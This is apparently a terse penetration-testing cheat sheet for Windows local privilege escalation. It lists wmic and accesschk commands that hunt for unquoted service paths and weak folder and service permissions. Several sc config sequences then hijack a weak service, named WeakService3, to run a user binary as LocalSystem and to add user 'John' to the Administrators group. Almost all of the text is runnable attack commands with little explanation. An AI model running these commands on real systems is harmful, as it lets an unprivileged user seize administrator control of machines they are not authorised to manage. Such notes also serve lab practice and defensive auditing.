wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """


```
#Find all weak folder permissions per drive.
accesschk.exe /accepteula 
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "John" c:\
```
```
#Find all weak folder permissions per drive.
 accesschk.exe -uwdqs Users c:\
 accesschk.exe -uwdqs "Authenticated Users" c:\
```
```
#Check what access authenticated users have to services.
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "John" *
```
```
sc config WeakService3 binpath= "C:\Users\John\Desktop\protect.exe"
sc config WeakService3  obj= ".\LocalSystem" password= ""
sc config WeakService3  start= "demand"
net start WeakService3
```
```
sc config WeakService3  binpath= "net localgroup Administrators John /add"
sc config WeakService3  obj= ".\LocalSystem" password= ""
sc config WeakService3  start= "demand"
```
